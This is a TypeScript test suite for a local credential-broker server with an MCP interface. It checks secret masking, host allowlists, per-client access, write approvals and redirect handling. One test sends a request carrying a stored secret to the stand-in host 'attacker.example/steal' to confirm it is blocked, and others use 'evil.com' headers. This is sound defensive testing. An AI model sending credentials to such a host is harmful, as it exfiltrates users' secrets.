import * as http from "http";
import { AddressInfo } from "net";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { AuditLog } from "../src/audit/auditLog";
import { Approver, Broker } from "../src/engine/broker";
import { utf8ToBase64 } from "../src/engine/placeholders";
import { nodeTransport } from "../src/engine/transport";
import { ClientRecord, contextOf, createClient, findClient } from "../src/server/clients";
import { LocalServer } from "../src/server/localServer";
import { SecretStore } from "../src/store/secretStore";
import { secretInput, unlockedStore } from "./helpers";

// A fake upstream API that echoes what it received, including the Authorization header.
let upstream: http.Server;
let upstreamPort = 0;
let lastAuth: string | undefined;
const requests: string[] = [];
let server: LocalServer;
let store: SecretStore;
let token = "";
let limitedToken = "";
let approveNext = true;
const audit = new AuditLog();
const PORT = 27199;

beforeAll(async () => {
  upstream = http.createServer((req, res) => {
    lastAuth = req.headers.authorization;
    requests.push(req.url ?? "");
    if (req.url === "/partial-echo") {
      // An API that echoes a truncated token in its error message.
      res.writeHead(401, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: `invalid token ${secretInput().value.slice(0, 14)}...` }));
      return;
    }
    if (req.url === "/redirect-away") {
      res.writeHead(302, { Location: `http://localhost:${upstreamPort}/landing` });
      res.end();
      return;
    }
    res.writeHead(200, { "Content-Type": "application/json", "X-Echo": String(req.headers.authorization ?? "") });
    res.end(JSON.stringify({ path: req.url, auth: req.headers.authorization ?? null }));
  });
  await new Promise<void>((r) => upstream.listen(0, "127.0.0.1", () => r()));
  upstreamPort = (upstream.address() as AddressInfo).port;

  ({ store } = await unlockedStore());
  await store.add(
    secretInput({ allowHttpLocalhost: true, allowedHosts: [`127.0.0.1:${upstreamPort}`], approval: "writes" }),
  );
  const full = await createClient("test", { mode: "all" });
  token = full.token;
  // A second client that may only use a secret that does not exist: it can use nothing.
  const limited = await createClient("limited", { mode: "some", secretIds: ["nope"] });
  limitedToken = limited.token;
  const clients: ClientRecord[] = [full.record, limited.record];
  const approver: Approver = async () => approveNext;
  const broker = new Broker(store, nodeTransport, approver, audit, () => ({ timeoutMs: 5000, maxResponseBytes: 1_000_000, maxRedirects: 5 }));
  server = new LocalServer({
    port: PORT,
    broker,
    version: "test",
    authenticate: async (tk) => {
      const c = await findClient(clients, tk);
      return c ? contextOf(c) : null;
    },
  });
  await server.start();
});

afterAll(async () => {
  await server.stop();
  await new Promise<void>((r) => upstream.close(() => r()));
});

const base = `http://127.0.0.1:${PORT}`;
const auth = () => ({ Authorization: `Bearer ${token}`, "Content-Type": "application/json" });

async function mcp(body: unknown) {
  const res = await fetch(`${base}/mcp`, { method: "POST", headers: { ...auth(), Accept: "application/json, text/event-stream" }, body: JSON.stringify(body) });
  return { status: res.status, json: res.status === 202 ? null : await res.json() };
}

describe("local server", () => {
  it("requires a client token", async () => {
    const res = await fetch(`${base}/v1/secrets`);
    expect(res.status).toBe(401);
  });

  it("rejects browser origins and foreign Host headers", async () => {
    const res = await fetch(`${base}/v1/secrets`, { headers: { ...auth(), Origin: "https://evil.com" } });
    expect(res.status).toBe(403);
    const raw = await new Promise<number>((resolve) => {
      http.get({ host: "127.0.0.1", port: PORT, path: "/v1/health", headers: { Host: "evil.com" } }, (r) => resolve(r.statusCode ?? 0));
    });
    expect(raw).toBe(421);
  });

  it("lists metadata without values", async () => {
    const res = await fetch(`${base}/v1/secrets`, { headers: auth() });
    const text = await res.text();
    expect(res.status).toBe(200);
    expect(text).toContain("JIRA_ACME");
    expect(text).not.toContain(secretInput().value);
  });

  it("sends the real secret upstream and masks it in the response", async () => {
    const res = await fetch(`${base}/v1/request`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ url: `http://127.0.0.1:${upstreamPort}/rest/api/3/myself`, headers: { Authorization: "{{basic:JIRA_ACME}}" } }),
    });
    const json = await res.json();
    const expected = "Basic " + utf8ToBase64(`bot@acme.com:${secretInput().value}`);
    expect(lastAuth).toBe(expected);
    expect(json.ok).toBe(true);
    expect(JSON.stringify(json)).not.toContain(secretInput().value);
    expect(JSON.stringify(json)).not.toContain(expected.slice(6));
    expect(json.body).toContain("***");
    expect(json.redactions).toBeGreaterThan(0);
  });

  it("does not follow a redirect to a host the secret is not allowed for", async () => {
    requests.length = 0;
    const res = await fetch(`${base}/v1/request`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ url: `http://127.0.0.1:${upstreamPort}/redirect-away`, headers: { Authorization: "{{basic:JIRA_ACME}}" } }),
    });
    const json = await res.json();
    expect(json.ok).toBe(true);
    expect(json.status).toBe(302);
    expect(json.headers.location).toContain("localhost");
    expect(requests).toEqual(["/redirect-away"]); // /landing was never requested
  });

  it("enforces per-client access", async () => {
    const list = await fetch(`${base}/v1/secrets`, { headers: { Authorization: `Bearer ${limitedToken}` } });
    expect((await list.json()).secrets).toEqual([]);
    const res = await fetch(`${base}/v1/request`, {
      method: "POST",
      headers: { Authorization: `Bearer ${limitedToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ url: `http://127.0.0.1:${upstreamPort}/ok`, headers: { Authorization: "{{basic:JIRA_ACME}}" } }),
    });
    expect(res.status).toBe(403);
    expect((await res.json()).error.code).toBe("secret_not_permitted");
  });

  it("masks fragments of the token in upstream error bodies", async () => {
    const res = await fetch(`${base}/v1/request`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ url: `http://127.0.0.1:${upstreamPort}/partial-echo`, headers: { Authorization: "{{basic:JIRA_ACME}}" } }),
    });
    const json = await res.json();
    expect(json.status).toBe(401);
    expect(json.body).not.toContain(secretInput().value.slice(0, 14));
    expect(json.body).toContain("***");
  });

  it("blocks exfiltration to hosts that are not allowed", async () => {
    const res = await fetch(`${base}/v1/request`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ url: "https://attacker.example/steal", headers: { Authorization: "{{basic:JIRA_ACME}}" } }),
    });
    expect(res.status).toBe(403);
    expect((await res.json()).error.code).toBe("host_not_allowed");
  });

  it("asks for approval on writes", async () => {
    approveNext = false;
    const res = await fetch(`${base}/v1/request`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ method: "DELETE", url: `http://127.0.0.1:${upstreamPort}/x`, headers: { Authorization: "{{basic:JIRA_ACME}}" } }),
    });
    expect(res.status).toBe(403);
    expect((await res.json()).error.code).toBe("denied");
    approveNext = true;
  });

  it("speaks MCP", async () => {
    const init = await mcp({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "t", version: "1" } } });
    expect(init.json.result.protocolVersion).toBe("2025-06-18");
    expect((await mcp({ jsonrpc: "2.0", method: "notifications/initialized" })).status).toBe(202);
    const tools = await mcp({ jsonrpc: "2.0", id: 2, method: "tools/list" });
    expect(tools.json.result.tools.map((t: { name: string }) => t.name)).toEqual(["list_secrets", "http_request"]);
    const call = await mcp({
      jsonrpc: "2.0",
      id: 3,
      method: "tools/call",
      params: { name: "http_request", arguments: { url: `http://127.0.0.1:${upstreamPort}/ok`, headers: { Authorization: "{{basic:JIRA_ACME}}" } } },
    });
    expect(call.json.result.isError).toBe(false);
    expect(call.json.result.content[0].text).not.toContain(secretInput().value);
  });

  it("answers 423 when locked", async () => {
    store.lock();
    const res = await fetch(`${base}/v1/secrets`, { headers: auth() });
    expect(res.status).toBe(423);
  });

  it("never logs values", () => {
    expect(JSON.stringify(audit.list())).not.toContain(secretInput().value);
  });
});
